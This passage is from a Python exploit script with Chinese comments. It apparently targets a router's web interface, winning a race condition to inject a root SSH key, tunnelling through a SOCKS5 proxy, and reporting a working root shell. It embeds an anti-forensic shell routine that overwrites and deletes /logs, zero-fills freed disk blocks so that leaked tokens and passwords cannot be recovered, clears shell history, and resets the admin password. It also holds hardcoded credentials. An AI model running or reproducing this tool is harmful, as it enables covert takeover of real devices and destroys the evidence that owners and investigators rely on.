    [ -n "$sz" ] && [ "$sz" -gt 0 ] || continue
    dd if=/dev/zero of="$f" bs=4096 conv=notrunc count=$(( (sz + 4095) / 4096 )) 2>/dev/null
done
sync
echo "[*] ① 覆写完成 $(date)"

# ② 删除 + 重建目录 + 恢复原权限
#    -mindepth 1 保住 /logs 挂载点自身（drwxrwxrwt 1777）
find /logs -mindepth 1 -maxdepth 1 | xargs rm -rf
mkdir -p /logs/core /logs/err/recov /logs/pstore /logs/sec /logs/history
chmod 755 /logs/core /logs/err /logs/err/recov /logs/history
chmod 750 /logs/pstore
chmod 700 /logs/sec
chgrp 1100 /logs/history
sync
echo "[*] ② 清空+重建完成"

# ②b 有界零填 —— 覆盖「已释放但仍是脏数据」的块
#     为什么要这步：① 只碰还有目录项的文件。抢窗口那 40 秒里 CGI 疯狂写日志、
#     文件涨大又被轮转/截断释放，那些块 ① 永远够不着。实测单次 run 在裸分区
#     仍留 4213 处 b10sk / 3754 处 ipaddress= / 两个明文口令。
#     为什么在 ② 之后：删掉活文件把它们的块也还回空闲池，一趟填充能覆盖更大的池子。
#     为什么「有界」而不是 74_logs_wipe.md §3 的填到 ENOSPC：
#       ENOSPC 让所有写入方报错；中途中断会把 /logs 停在 100%，
#       而开机 check_logs_partition 看到 >=99% 会 rm -rf 整个分区。
#       这里最高只填到 97%，低于那个阈值。
#     多趟不同粒度是 §4 的教训：单趟 bs=1M 会留 1.7MB 碎片空洞。
#     oflag=direct 绕 page cache 是 §9 的教训：内存尖峰把隧道弄死过。
#     ★ 覆盖率不是 100%，必须用裸分区复检闭环（见 README 的验证命令）。
_TOTAL=$(df -k /logs 2>/dev/null | awk 'NR==2{print $2}')
if dd if=/dev/zero of=/logs/.wipe bs=4k oflag=direct count=1 2>/dev/null; then
    _OF="oflag=direct"
else
    _OF=""
fi
rm -f /logs/.wipe; sync
echo "[*] ②b 零填开始 total=${_TOTAL}KB oflag='${_OF}'"

for _p in 64:90 8:95 4:97; do
    _bs=${_p%%:*}; _pct=${_p##*:}
    _USED=$(df -k /logs 2>/dev/null | awk 'NR==2{print $3}')
    _KB=$(( _TOTAL * _pct / 100 - _USED ))
    if [ "$_KB" -gt 0 ]; then
        dd if=/dev/zero of=/logs/.wipe bs=${_bs}k $_OF \
           count=$(( _KB / _bs )) 2>/dev/null
        sync
    fi
    rm -f /logs/.wipe; sync
    echo "[*] ②b 填到 ${_pct}% (bs=${_bs}k 目标${_KB}KB) $(date)"
done
echo "[*] ②b 零填结束"

# ③ 时间种子
#    /dev/rtc0 不存在、system.ntp.enabled=0 且无 ntpd → /logs 是唯一时间源。
#    startup:274 的 sync_time() 扫 /logs 取最新 mtime；空目录会让 maxtime 为空，
#    进而让 [ $curtime -lt $maxtime ] 在 ash 里语法报错。必须用当前时间。
touch -d "$(date '+%Y-%m-%d %H:%M:%S')" /logs/.seed
echo "[*] ③ 时间种子 $(ls -l /logs/.seed)"

# ④ shell 历史
#    实测（2024-09-24）：这台设备没有 bash，只有 busybox ash；HISTFILE 未设；
#    全盘 find / -name ".*history" 零命中。而且本脚本走的是非交互式 SSH
#    （exec_command），本来就不写历史。所以这一步在现状下是空转，
#    留着是为了兜底：万一有人设过 HISTFILE，或以后换了 shell。
history -c 2>/dev/null
for h in "$HOME/.ash_history" /root/.ash_history /root/.bash_history \
         /.ash_history /tmp/.ash_history; do
    [ -f "$h" ] || continue
    sz=$(stat -c%s "$h" 2>/dev/null)
    [ -n "$sz" ] && [ "$sz" -gt 0 ] && \
        dd if=/dev/zero of="$h" bs=4096 conv=notrunc \
           count=$(( (sz + 4095) / 4096 )) 2>/dev/null
    rm -f "$h"
    echo "[*] ④ 已清历史文件 $h"
done
echo "[*] ④ shell 历史已清"

echo "[*] 最终:"
ls -la /logs
df -k /logs
echo WIPE_OK
'''


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.12.1")
    ap.add_argument("--scheme", default="https", choices=("https", "http"),
                    help="WebUI 协议（默认 https）")
    ap.add_argument("--port", type=int, default=443,
                    help="WebUI 端口（默认 443；证书不校验）")
    ap.add_argument("--user", default="admin")
    ap.add_argument("--password", default="qpxqj35bsfbjb4")
    ap.add_argument("--iface", default="eth0.1999")
    ap.add_argument("--race", type=int, default=40, help="抢窗口秒数")
    ap.add_argument("--up", type=int, default=2, help="上传线程数")
    ap.add_argument("--inj", type=int, default=4, help="注入线程数")
    ap.add_argument("--payload", default=None,
                    help="直接用这个文件当设备侧脚本（跳过模板渲染）")
    ap.add_argument("--pad", type=int, default=32,
                    help="给 payload 追加 N KB 注释填充，拉长落盘->删除的窗口（默认 32，别设 0）")
    ap.add_argument("--pubkey", default=os.path.join(HERE, "b10key.pub"))
    ap.add_argument("--key", default=os.path.join(HERE, "b10key"))
    ap.add_argument("--proxy", default=SHELL_PROXY,
                    help="WebUI 与 SSH 共用的 SOCKS5 出口（默认 %s）" % SHELL_PROXY)
    ap.add_argument("--no-socks5", dest="no_socks5", action="store_true",
                    help="直连目标，两条通道都不走 --proxy")
    ap.add_argument("--restore", action="store_true",
                    help="打完把 /root/.ssh/authorized_keys 还原（不给 shell，仅验证）")
    # /logs 清理：默认开。用 --no-wipe-logs 关掉。
    ap.add_argument("--wipe-logs", dest="wipe_logs", action="store_true", default=True,
                    help="拿到 root 后就地覆写 /logs（默认开启）")
    ap.add_argument("--no-wipe-logs", dest="wipe_logs", action="store_false",
                    help="跳过 /logs 清理，只装公钥")
    ap.add_argument("--web-password", default="Admin@123",
                    help="清理前把 Web 管理密码改成这个值并落 flash")
    a = ap.parse_args()
    # 两条通道（WebUI 的 build_opener、SSH 的 SocksRelay）都按「proxy 为假值 = 直连」
    # 处理，所以这里归一化成 None，后面不用再分情况。
    if a.no_socks5:
        a.proxy = None

    ensure_keypair(a.key)
    if a.payload:
        payload = open(a.payload, encoding="utf-8").read()
        tag = "custom"
    else:
        payload, tag = make_payload(a.pubkey)
    if a.pad:
        payload += "\n# " + ("-" * 60) + "\n"
        payload += "".join("# pad %06d %s\n" % (i, "x" * 48)
                           for i in range(a.pad * 16))

    netloc = web_netloc(a.host, a.scheme, a.port)
    base = web_base(a.host, a.scheme, a.port)
    print("[*] 公钥: %s  (tag=%s)" % (a.pubkey, tag))
    print("[*] 目标: %s  设备侧脚本 %d 字节" % (a.host, len(payload)), flush=True)
    print("[*] WebUI: %s  (TLS 证书不校验)" % base, flush=True)
    print("[*] 出口: %s" % (a.proxy or "直连（--no-socks5）"), flush=True)

    c = B10Client(netloc, a.user, a.password, proxy=a.proxy, scheme=a.scheme)
    c.login()
    # 注意：不要再 login() 第二次。这台设备一个用户只保留最后一个会话，
    # 多登一次会把上面这个 sid 踢掉，两个线程就全是 SPA（redirect 到 /）。
    # 抢窗口的上传/注入各用独立 opener 即可，会话沿用同一个 sid。
    print("[+] 会话 sid=%s" % c.sid, flush=True)

    if a.restore:
        print("[*] --restore: 打完会清掉 authorized_keys")

    print("\n[*] 抢窗口 %ds ..." % a.race, flush=True)
    stat = race(base, c.sid, c.token or "", a.iface, a.race, payload,
                build_opener(a.proxy), build_opener(a.proxy),
                n_up=a.up, n_inj=a.inj)
    print("[*] 结束：上传 %d  注入 ok=%d spa=%d 慢请求=%d 峰值=%.1fs"
          % (stat["up"], stat["inj"], stat["spa"], stat["slow"], stat["maxs"]),
          flush=True)
    if stat.get("spa_sample"):
        print("[*] spa 响应样本: %s"
              % stat["spa_sample"].replace("\n", " ")[:300], flush=True)

    print("\n[*] 验 SSH ...", flush=True)
    try:
        out = ssh_check(a.host, a.key, a.proxy)
        print("    >>> root shell OK <<<")
        print("    " + out.strip().replace("\n", "\n    "))
    except Exception as e:
        print("    FAIL: %s" % str(e)[:150])
        print("    (抢窗口是概率事件，没中就再跑一次)")
        return 1

    # ---- 收尾：全部走 SSH 通道 ----
    # 已经用公钥登进去了，没必要为了「删公钥」再抢一次窗口（那样反而会重新
    # POST usb_web_app.cgi，把 csrf_token 又写回 /logs/cgipost）。
    # dropbear 是连接建立时做的认证，所以 rm authorized_keys 不影响当前这条
    # 连接 —— 清 log 和删公钥可以串在同一个会话里，顺序也对（公钥放最后）。
    tail = []
    steps = []
    if a.wipe_logs:
        # 密码要内插进 shell 双引号里，含这些字符会破坏引用（也就成了注入点）
        if any(ch in a.web_password for ch in '"$`\\'):
            print("\n[!] --web-password 含 \" $ ` \\ 之一，会破坏 shell 引用，拒绝执行")
            return 1
        tail.append(WIPE_LOGS_SH.replace("__WEB_PASSWORD__", a.web_password))
        steps.append("改 Web 密码 + 清 /logs")
    if a.restore:
        tail.append("rm -f /root/.ssh/authorized_keys\necho KEY_REMOVED")
        steps.append("删公钥")

    if tail:
        print("\n[*] 收尾: %s" % " + ".join(steps), flush=True)
        try:
            rc, out = ssh_exec(a.host, a.key, "\n".join(tail), a.proxy)
            print("    " + out.strip().replace("\n", "\n    "))
            if a.wipe_logs and "WIPE_OK" not in out:
                print("    !!! 未见 WIPE_OK（退出码 %s）——可能被中途打断，重跑一次" % rc)
        except Exception as e:
            print("    FAIL: %s" % str(e)[:150])
    else:
        print("\n[*] --no-wipe-logs：跳过 /logs 清理")

    print("\n[*] 上机:")
    print("    ssh -i %s root@%s" % (a.key, a.host))

    if a.restore:
        print("\n[*] 验证公钥已移除 ...", flush=True)
        try:
            ssh_check(a.host, a.key, a.proxy, timeout=10)
            print("    !!! 还能连上，没清掉")
        except Exception:
            print("    已清除（再连会失败）")
    return 0


if __name__ == "__main__":
    sys.exit(main())
